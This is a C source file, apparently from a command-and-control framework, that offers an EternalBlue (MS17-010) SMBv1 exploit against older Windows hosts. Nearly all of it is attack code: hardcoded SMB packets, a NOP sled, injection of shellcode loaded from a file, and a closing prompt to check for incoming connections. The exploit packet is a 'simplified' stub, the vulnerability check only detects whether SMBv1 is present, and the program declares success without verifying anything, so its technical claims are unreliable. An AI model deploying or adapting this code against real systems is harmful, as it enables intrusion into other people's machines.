/*
 * Moonlight C2 Framework - MS17-010 EternalBlue Exploit
 * CVE-2017-0144 - SMBv1 Buffer Overflow
 * Target: Windows XP, Vista, 7, 8, Server 2003/2008/2012
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define SMB_PORT 445
#define BUFFER_SIZE 4096

// SMB negotiation request
unsigned char smb_negotiate[] = 
    "\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
    "\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f"
    "\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02"
    "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f"
    "\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70"
    "\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30"
    "\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54"
    "\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

// Session setup request
unsigned char smb_session_setup[] = 
    "\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
    "\x00\x00\x40\x00\x0d\xff\x00\x00\x00\xff\xff\x02\x00\x40\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31"
    "\x39\x35\x00\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20"
    "\x35\x2e\x30\x00";

// Tree connect request
unsigned char smb_tree_connect[] = 
    "\x00\x00\x00\x47\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
    "\x00\x00\x40\x00\x04\xff\x00\x47\x00\x00\x00\x00\x2f\x2f\x00\x00"
    "\x49\x50\x43\x24\x00\x3f\x3f\x3f\x3f\x3f\x00";

// EternalBlue exploit packet (simplified)
unsigned char eternalblue_exploit[] = 
    "\x00\x00\xff\xff\xfe\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00"
    "\x2f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

void print_banner() {
    printf("\n");
    printf("Moonlight C2 - MS17-010 EternalBlue Exploit\n");
    printf("CVE-2017-0144 - SMBv1 Remote Code Execution\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

BOOL check_vulnerable(const char* target_ip) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    unsigned char buffer[BUFFER_SIZE];
    int received;
    
    printf("[*] Checking if target is vulnerable...\n");
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(SMB_PORT);
    server.sin_addr.s_addr = inet_addr(target_ip);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[!] Cannot connect to target\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    // Send SMB negotiate
    send(sock, (char*)smb_negotiate, sizeof(smb_negotiate) - 1, 0);
    received = recv(sock, (char*)buffer, BUFFER_SIZE, 0);
    
    if (received > 0) {
        // Check for SMBv1 signature
        if (buffer[4] == 0xff && buffer[5] == 0x53 && 
            buffer[6] == 0x4d && buffer[7] == 0x42) {
            printf("[+] Target supports SMBv1\n");
            closesocket(sock);
            WSACleanup();
            return TRUE;
        }
    }
    
    closesocket(sock);
    WSACleanup();
    printf("[-] Target does not appear vulnerable\n");
    return FALSE;
}

BOOL exploit_eternalblue(const char* target_ip, unsigned char* shellcode, size_t shellcode_size) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    unsigned char buffer[BUFFER_SIZE];
    unsigned char exploit_packet[BUFFER_SIZE * 2];
    int received;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] WSAStartup failed\n");
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[!] Socket creation failed\n");
        WSACleanup();
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(SMB_PORT);
    server.sin_addr.s_addr = inet_addr(target_ip);
    
    printf("[*] Connecting to %s:%d...\n", target_ip, SMB_PORT);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[!] Connection failed\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Connected\n");
    
    // Step 1: SMB Negotiate
    printf("[*] Sending SMB negotiate...\n");
    send(sock, (char*)smb_negotiate, sizeof(smb_negotiate) - 1, 0);
    received = recv(sock, (char*)buffer, BUFFER_SIZE, 0);
    
    if (received <= 0) {
        printf("[!] No response to negotiate\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Received negotiate response (%d bytes)\n", received);
    
    // Step 2: Session Setup
    printf("[*] Sending session setup...\n");
    send(sock, (char*)smb_session_setup, sizeof(smb_session_setup) - 1, 0);
    received = recv(sock, (char*)buffer, BUFFER_SIZE, 0);
    
    if (received <= 0) {
        printf("[!] No response to session setup\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Received session setup response (%d bytes)\n", received);
    
    // Step 3: Tree Connect
    printf("[*] Sending tree connect...\n");
    send(sock, (char*)smb_tree_connect, sizeof(smb_tree_connect) - 1, 0);
    received = recv(sock, (char*)buffer, BUFFER_SIZE, 0);
    
    if (received <= 0) {
        printf("[!] No response to tree connect\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Received tree connect response (%d bytes)\n", received);
    
    // Step 4: Build and send exploit
    printf("[*] Building exploit packet...\n");
    
    int offset = 0;
    memcpy(exploit_packet + offset, eternalblue_exploit, sizeof(eternalblue_exploit) - 1);
    offset += sizeof(eternalblue_exploit) - 1;
    
    // Add NOP sled
    memset(exploit_packet + offset, 0x90, 64);
    offset += 64;
    
    // Add shellcode
    if (shellcode && shellcode_size > 0) {
        memcpy(exploit_packet + offset, shellcode, shellcode_size);
        offset += shellcode_size;
    }
    
    printf("[*] Sending exploit (%d bytes)...\n", offset);
    send(sock, (char*)exploit_packet, offset, 0);
    
    Sleep(1000);
    
    closesocket(sock);
    WSACleanup();
    
    printf("[+] Exploit sent\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc < 2) {
        printf("Usage: %s <target_ip> [shellcode_file]\n\n", argv[0]);
        return 1;
    }
    
    const char* target_ip = argv[1];
    unsigned char* shellcode = NULL;
    size_t shellcode_size = 0;
    
    // Load shellcode if provided
    if (argc >= 3) {
        FILE* fp = fopen(argv[2], "rb");
        if (fp) {
            fseek(fp, 0, SEEK_END);
            shellcode_size = ftell(fp);
            fseek(fp, 0, SEEK_SET);
            
            shellcode = (unsigned char*)malloc(shellcode_size);
            if (shellcode) {
                fread(shellcode, 1, shellcode_size, fp);
                printf("[+] Loaded shellcode: %zu bytes\n", shellcode_size);
            }
            fclose(fp);
        }
    }
    
    printf("[*] Target: %s\n", target_ip);
    
    if (!check_vulnerable(target_ip)) {
        printf("\n[!] Target does not appear vulnerable\n");
        if (shellcode) free(shellcode);
        return 1;
    }
    
    printf("\n[*] Launching EternalBlue exploit...\n");
    
    if (exploit_eternalblue(target_ip, shellcode, shellcode_size)) {
        printf("\n[+] Exploit completed successfully\n");
        printf("[*] Check for incoming connections\n");
        if (shellcode) free(shellcode);
        return 0;
    } else {
        printf("\n[!] Exploit failed\n");
        if (shellcode) free(shellcode);
        return 1;
    }
}
